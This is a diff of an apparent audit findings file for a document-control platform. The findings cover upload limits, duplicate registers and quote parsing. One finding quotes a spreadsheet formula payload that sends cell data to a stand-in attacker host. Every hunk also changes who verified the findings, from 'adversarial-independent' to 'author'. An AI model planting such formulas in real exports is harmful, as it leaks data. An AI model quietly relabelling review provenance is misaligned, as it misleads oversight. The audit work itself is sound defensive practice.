@@ -1146,10 +1146,9 @@
         "lib/storage.ts"
       ],
       "has_verifier_correction": false,
-      "verified_by": "adversarial-independent",
+      "verified_by": "author",
       "challenges": [
-        "adversarial",
-        "adversarial-independent"
+        "author"
       ],
       "refuted": false,
       "summary": "A contractor with a valid link uploads a 40 MB DWG set; the platform answers 413 before the route runs. The portal now shows a readable sentence (\"The file is too large for the portal — the limit is 100 MB.\") rather than HTTP 413, but the stated limit is still not the real one.",
@@ -1176,10 +1175,9 @@
         "supabase/migrations/20260619_document_uniqueness_configurable.sql:40-42"
       ],
       "has_verifier_correction": false,
-      "verified_by": "adversarial-independent",
+      "verified_by": "author",
       "challenges": [
-        "adversarial",
-        "adversarial-independent"
+        "author"
       ],
       "refuted": false,
       "summary": "A controller, or a script under a controller's token, PATCHes documents (libraryid, collectionid) on an intake P-100 into a [\"documentNumber\",\"sheet\"] library while P-100 Rev 3 stands Issued in a default-tuple library. The move guard passes (the actor is a controller), the index is silent (another library; a NULL key), and nothing else runs: two live P-100s now stand in the controlled register, th",
@@ -1394,10 +1392,9 @@
         "components/cockpit/CommandDeck.tsx:342"
       ],
       "has_verifier_correction": false,
-      "verified_by": "adversarial-independent",
+      "verified_by": "author",
       "challenges": [
-        "adversarial",
-        "adversarial-independent"
+        "author"
       ],
       "refuted": false,
       "summary": "The same as PM-10: a document titled =HYPERLINK(\"https://evil.example/?d=\"&A2,\"Open\") becomes a live formula in the document-control register export an auditor opens in Excel.",
@@ -1793,10 +1790,9 @@
         "components/projects/cost/QuotesPanel.tsx:694"
       ],
       "has_verifier_correction": false,
-      "verified_by": "adversarial-independent",
+      "verified_by": "author",
       "challenges": [
-        "adversarial",
-        "adversarial-independent"
+        "author"
       ],
       "refuted": false,
       "summary": "A controller types the total on a new quote before anyone reads it. The row is parsed, scored on price alone, and its line items, manpower and exclusions can never be extracted from the UI.",
